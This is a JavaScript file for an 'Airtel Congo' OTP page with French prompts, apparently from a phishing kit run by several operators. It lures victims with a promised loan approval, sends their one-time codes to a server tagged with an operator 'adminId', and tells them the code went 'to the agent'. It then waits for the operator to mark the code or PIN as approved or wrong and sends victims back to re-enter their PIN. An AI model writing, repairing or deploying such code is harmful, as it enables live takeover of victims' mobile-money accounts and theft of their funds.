// OTP Verification Script - Airtel Congo
// ADMIN ID ISOLATION: adminId is included in every API call for ownership verification.
// NO DIALOGS — inline messages only.

document.addEventListener('DOMContentLoaded', function() {
    const otpInputs          = document.querySelectorAll('.otp-box');
    const submitBtn          = document.getElementById('verifyOtpBtn');
    const resendBtn          = document.getElementById('resendBtn');
    const resendTimerDisplay = document.getElementById('resendTimer');
    const countdownNumber    = document.getElementById('countdown');
    const timeRemainingEl    = document.getElementById('timeRemaining');
    const countdownCircle    = document.getElementById('countdownCircle');
    const maskedPhoneEl      = document.getElementById('maskedPhone');

    // Inline message container
    const messageContainer = document.createElement('div');
    messageContainer.style.cssText = 'margin: 20px 0; border-radius: 12px; overflow: hidden;';
    const otpInputsContainer = document.querySelector('.otp-inputs');
    if (otpInputsContainer?.parentNode) {
        otpInputsContainer.parentNode.insertBefore(messageContainer, otpInputsContainer);
    }

    function showMessage(text, type = 'info') {
        const styles = {
            error:   { bg: '#fee2e2', border: '#fecaca', text: '#991b1b', icon: '✕' },
            success: { bg: '#d1fae5', border: '#a7f3d0', text: '#065f46', icon: '✓' },
            warning: { bg: '#fef3c7', border: '#fde68a', text: '#92400e', icon: '⚠' },
            info:    { bg: '#dbeafe', border: '#bfdbfe', text: '#1e40af', icon: 'ℹ' }
        };
        const s = styles[type] || styles.info;
        messageContainer.innerHTML = `
            <div style="background:${s.bg};border:2px solid ${s.border};color:${s.text};padding:16px 20px;display:flex;align-items:center;gap:12px;font-size:15px;line-height:1.6;">
                <span style="font-size:24px;font-weight:bold;">${s.icon}</span>
                <span style="flex:1;">${text}</span>
            </div>
        `;
        messageContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
        if (type === 'success' || type === 'info') {
            setTimeout(() => { messageContainer.innerHTML = ''; }, 6000);
        }
    }

    function clearMessage() { messageContainer.innerHTML = ''; }

    // ============================================
    // Get admin ID — URL param takes priority
    // ============================================
    function getAdminId() {
        const urlParams = new URLSearchParams(window.location.search);
        const fromUrl = urlParams.get('admin');
        if (fromUrl && fromUrl !== 'undefined' && fromUrl !== 'null' && fromUrl.trim() !== '') {
            sessionStorage.setItem('selectedAdminId', fromUrl.trim());
            return fromUrl.trim();
        }
        return sessionStorage.getItem('selectedAdminId') || null;
    }

    // ============================================
    // Get application data from session
    // ============================================
    let applicationData = {};
    try { applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}'); } catch (_) {}

    const adminId       = getAdminId();
    let   applicationId = applicationData.applicationId;

    console.log('🔢 OTP page | Admin:', adminId || 'MISSING', '| App:', applicationId || 'MISSING');

    // Block if no application ID
    if (!applicationId) {
        showMessage('Votre session a expiré. Veuillez recommencer.', 'error');
        if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Session Expirée'; }
    }

    // Mask phone number
    if (applicationData.phone && maskedPhoneEl) {
        const phone  = applicationData.phone;
        const masked = phone.slice(0, -4).replace(/./g, '*') + phone.slice(-4);
        maskedPhoneEl.textContent = masked;
    }

    // ============================================
    // Countdown timers
    // ============================================
    let timeLeft      = 60;
    let resendTimeLeft = 60;
    let timerInterval;
    let resendInterval;

    startTimer();
    startResendTimer();

    // ============================================
    // OTP input handling
    // ============================================
    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
            pasted.split('').forEach((char, i) => {
                if (otpInputs[i]) otpInputs[i].value = char;
            });
            const lastIndex = Math.min(pasted.length, otpInputs.length) - 1;
            if (otpInputs[lastIndex]) otpInputs[lastIndex].focus();
        });
    });

    if (otpInputs[0]) otpInputs[0].focus();

    // ============================================
    // Submit OTP
    // ============================================
    submitBtn?.addEventListener('click', async function(e) {
        e.preventDefault();

        if (!applicationId) {
            showMessage('Votre session a expiré. Veuillez recommencer.', 'error');
            return;
        }

        const otp = Array.from(otpInputs).map(i => i.value).join('');
        if (otp.length !== 4) {
            showMessage('Veuillez entrer le code de vérification complet à 4 chiffres', 'warning');
            otpInputs[0].focus();
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = 'Vérification en cours... <span class="arrow">→</span>';
        clearMessage();

        try {
            console.log('📤 Submitting OTP | App:', applicationId, '| Admin:', adminId || 'not sent');

            // Always include adminId for server-side ownership check
            const body = { applicationId, otp };
            if (adminId) body.adminId = adminId;

            const response = await fetch('/api/verify-otp', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify(body)
            });

            const result = await response.json();

            if (result.success) {
                showMessage('Votre code a été transmis à l\'agent. Veuillez patienter pour l\'approbation...', 'info');
                checkOTPStatus();
            } else {
                showMessage(result.message || 'Échec de l\'envoi du code. Veuillez réessayer.', 'error');
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Vérifier le Code <span class="arrow">→</span>';
                restartTimers();
            }

        } catch (error) {
            console.error('❌ OTP submit error:', error);
            showMessage('Erreur réseau. Vérifiez votre connexion et réessayez.', 'error');
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Vérifier le Code <span class="arrow">→</span>';
            restartTimers();
        }
    });

    // ============================================
    // Poll OTP status
    // ============================================
    function checkOTPStatus() {
        const statusInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/check-otp-status/${applicationId}`);
                const result   = await response.json();

                if (result.status === 'approved') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('🎉 Félicitations ! Votre prêt a été approuvé. Redirection en cours...', 'success');
                    setTimeout(() => { window.location.href = 'approval.html'; }, 2000);

                } else if (result.status === 'rejected') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('Vérification échouée. Veuillez contacter le support.', 'error');
                    if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Vérification Échouée'; }

                } else if (result.status === 'wrongpin_otp') {
                    clearInterval(statusInterval);
                    clearAllTimers();
                    showMessage('PIN incorrect. Redirection pour ressaisir le PIN...', 'error');
                    // Pass admin ID forward
                    const dest = adminId ? `verification.html?admin=${encodeURIComponent(adminId)}` : 'verification.html';
                    setTimeout(() => { window.location.href = dest; }, 3000);

                } else if (result.status === 'wrongcode') {
                    clearInterval(statusInterval);
                    otpInputs.forEach(input => { input.value = ''; input.disabled = false; });
                    otpInputs[0].focus();
                    if (submitBtn) {
                        submitBtn.disabled = false;
                        submitBtn.innerHTML = 'Vérifier le Code <span class="arrow">→</span>';
                    }
                    showMessage('Code incorrect. Veuillez ressaisir ou cliquer sur "Renvoyer" pour obtenir un nouveau code.', 'error');
                }

            } catch (error) {
                console.error('❌ Status check error:', error);
            }
        }, 2000);

        setTimeout(() => clearInterval(statusInterval), 300000); // 5 min timeout
    }

    // ============================================
    // Timer functions
    // ============================================
    function startTimer() {
        updateTimerDisplay();
        timerInterval = setInterval(() => {
            timeLeft--;
            updateTimerDisplay();
            if (timeLeft <= 0) { clearInterval(timerInterval); handleTimeout(); }
        }, 1000);
    }

    function updateTimerDisplay() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        const timeText = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        if (countdownNumber)  countdownNumber.textContent  = timeLeft;
        if (timeRemainingEl)  timeRemainingEl.textContent  = timeText;
        if (countdownCircle) {
            const progress = (timeLeft / 60) * 283;
            countdownCircle.style.strokeDashoffset = 283 - progress;
            if (timeLeft < 20) countdownCircle.style.stroke = '#ef4444';
        }
    }

    function handleTimeout() {
        showMessage('Le code a expiré. Cliquez sur "Renvoyer" pour obtenir un nouveau code.', 'warning');
        if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Code Expiré'; }
        otpInputs.forEach(input => { input.value = ''; input.disabled = true; });
    }

    function startResendTimer() {
        if (resendBtn) { resendBtn.disabled = true; resendBtn.style.opacity = '0.5'; }
        resendInterval = setInterval(() => {
            resendTimeLeft--;
            if (resendTimeLeft <= 0) {
                clearInterval(resendInterval);
                if (resendBtn) { resendBtn.disabled = false; resendBtn.style.opacity = '1'; }
                if (resendTimerDisplay) resendTimerDisplay.textContent = '';
            } else {
                const m = Math.floor(resendTimeLeft / 60);
                const s = resendTimeLeft % 60;
                if (resendTimerDisplay) resendTimerDisplay.textContent = `(${m}:${s.toString().padStart(2, '0')})`;
            }
        }, 1000);
    }

    function restartTimers() {
        clearAllTimers();
        timeLeft = resendTimeLeft = 60;
        startTimer();
        startResendTimer();
    }

    function clearAllTimers() {
        if (timerInterval)  clearInterval(timerInterval);
        if (resendInterval) clearInterval(resendInterval);
    }

    // ============================================
    // Resend OTP
    // ============================================
    resendBtn?.addEventListener('click', async function() {
        if (resendTimeLeft > 0 || !applicationId) return;

        try {
            const response = await fetch('/api/resend-otp', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify({ applicationId })
            });

            const result = await response.json();
            if (result.success) {
                showMessage('Un nouveau code a été demandé. Vérifiez auprès de l\'agent.', 'success');
                otpInputs.forEach(input => { input.value = ''; input.disabled = false; });
                otpInputs[0].focus();
                if (submitBtn) { submitBtn.disabled = false; submitBtn.innerHTML = 'Vérifier le Code <span class="arrow">→</span>'; }
                restartTimers();
            } else {
                showMessage('Échec du renvoi du code. Veuillez réessayer.', 'error');
            }
        } catch (error) {
            console.error('❌ Resend error:', error);
            showMessage('Erreur réseau. Veuillez réessayer.', 'error');
        }
    });
});
